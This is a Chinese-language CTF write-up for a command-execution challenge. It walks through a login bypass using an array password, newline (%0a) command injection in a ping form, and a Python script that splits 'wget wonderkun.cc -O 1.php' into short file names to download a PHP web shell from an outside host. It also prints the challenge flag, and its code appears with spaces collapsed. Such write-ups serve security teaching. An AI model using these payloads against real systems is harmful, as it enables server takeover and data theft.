# 题目：网络管理系统

### 题目描述：为写出好漏洞而生

### 题目难度： 🌟🌟🌟🌟

### 考点: 命令执行

### 维护：le31ei

### KEY: `flag{d15443798b35face458a88dc9561eaa7}`

### 配置信息： 
1. 开放端口： `8080`

### 解题过程：

首先发现有备份文件  index.php.bak  
下载下来,进行审计

```php

functiond_addslashes($array)
{
    foreach($arrayas$key=>$value)
    {
        if(!is_array($value))
        {
            !get_magic_quotes_gpc()&&$value=addslashes($value);
            $array[$key]=$value;
            }
            else{$array[$key]=d_addslashes($array[$key]);
            }}return$array;}$_POST=d_addslashes($_POST);$_GET=d_addslashes($_GET);
```

发现有伪全局过滤，注入就别想了．再继续往下看，这里存在一个逻辑漏洞：

PHP

$username=isset($_POST['username'])?$_POST['username']:die();$password=isset($_POST['password'])?md5($_POST['password']):die();$sql="select password from users  where username='$username'";$result=$conn->query($sql);if(!$result){die('alert("用户名或密码错误!!")');}$row=$result->fetch_assoc();if($row[0]===$password){$_SESSION['username']=$username;$_SESSION['status']=1;header("Location:./ping.php");}else{die("alert('用户名或密码错误!!')");}

关键点在这里：

PHP

if(!$result){die('alert("用户名或密码错误!!")');}

即便是我们输入一个不存在的用户,这if也永远不会被执行,因为 $db->query($sql) 返回的是一个mysql resource类型,始终不可能为空. 你可以用var_dump($result)试一下.

接下来就考察对php的熟悉程度了

PHP

$row[0]===$password

如果我们输入了一个不存在的用户名,那么$row[0] 是等于 NULL的,但是 md5($array) 也是返回 NULL,所以只需要让password是一个数组,就可以绕过这里

所以最终用户名密码为:

username=1&password[]=1

绕过登陆之后,发现可以执行ping命令,经过测试发现:

1. ip 必须是 x.x.x.x 的格式, x 代表 1-3个数字

2. ip长度必须大于等于7,小于等于15,否则都会返回ip格式错误

3. 可以使用这样格式的ip: x.x.x.x[任意字符]

当 ip为ip=0.0.0.1||2时,返回 PING 0.0.0.12 (0.0.0.12): 56 data bytes

说明了|| 被替换为空了,同样道理,你可以发现&,$,(),;`,都被替换为了空

最后发现 %0a没有被过滤:

测试:ip=0.0.0.1%0als -al,返回如下,说明ls已经成功执行.

PING 0.0.0.1 (0.0.0.1): 56 data bytes

total 8

drwxr-xr-x 2 www-data www-data 4096 Apr  7 04:54 .

drwxr-xr-x 5 www-data www-data 4096 Apr  7 04:54 ..

测试:ip=0.0.0.1%0apwd,返回了当前的绝对路径：

PING 0.0.0.1 (0.0.0.1): 56 data bytes

/usr/share/nginx/html/sandBox/10.36.101.50

发现只有七个字符的可控输入空间,就是7个字符的命令执行啦,参考这篇文章http://wonderkun.cc/index.html/?p=524

下面给出python的payload吧:

Python

#!/usr/bin/python#-*- coding: utf-8 -*-importrequestsdefGetShell():url="http://vctf.ctftools.com/ping.php"header={"Cookie":"PHPSESSID=5rfro3re8253tv5f6fp5kd74l6","Content-Type":"application/x-www-form-urlencoded"}#fileNames = ["1.php","-O\ \\","cn\ \\","\ a.\\","wget\\"]# linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"# 可以修改hosts文件，让a.cn指向一个自己的服务器。# 在a.cn 的根目录下创建index.html ，内容是一个php shell'''

wget\\

\ wo\\

nd\\

er\\

ku\\

n.\\

cc\ \\

-O\ \\

1.php

'''fileNames=["1.php","-O\ \\\\","cc\ \\\\","n.\\\\","ku\\\\","er\\\\","nd\\\\","\ wo\\\\","wget\\\\"]ip="0.0.0.1%0a"forfileNameinfileNames:createFileIp=ip+">"+fileNameprintcreateFileIp        data="ip="+createFileIp                requests.post(url,data=data,headers=header)proxy={"http":"127.0.0.1:8080"}getShIp=ip+"ls%20-t>1"printgetShIp    data="ip="+getShIp    requests.post(url,data=data,headers=header,proxies=proxy)getShellIp=ip+"sh%201"printgetShellIp    data="ip="+getShellIp    requests.post(url,data=data,headers=header,proxies=proxy)shellUrl="http://vctf.ctftools.com/sandBox/10.25.159.132/1.php"#10.25.159.132为自己IPresponse=requests.get(shellUrl)ifresponse.status_code==200:print"[*] Get shell !"else:print"[*] fail!"if__name__=="__main__":GetShell()

拿到shell之后,连接本地的数据库,获取flag
